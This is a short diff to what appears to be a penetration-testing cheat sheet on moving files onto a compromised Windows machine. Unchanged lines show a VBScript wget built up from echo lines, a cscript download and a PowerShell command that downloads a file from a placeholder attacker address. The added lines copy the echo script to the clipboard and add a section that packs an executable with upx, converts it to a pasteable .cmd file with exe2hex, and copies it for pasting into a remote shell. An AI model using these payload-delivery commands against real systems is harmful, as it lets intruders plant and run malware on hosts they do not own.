@@ -21,6 +21,7 @@ curl -L -O https://gist.githubusercontent.com/maddouri/da64f298e19bff0cd1ce46ee8
 ```
 ```
 cat wget.vbs | sed -e 's/^/echo /' | sed -e 's/$/>> wget.vbs/' > wget.vbs.echo
+cat wget.vbs.echo | xclip -selection clipboard
 ```
 ```
 cscript wget.vbs <url> (file)
@@ -31,3 +32,12 @@ cscript wget.vbs <url> (file)
 ```
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ipaddress/filename', 'filename')
 ```
+
+### Clipboard
+
+```
+upx -9 file.exe # compresses the file inplace
+exe2hex -x file.exe -p fild.cmd
+cat file.cmd | xclip -selection clipboard
+```
+
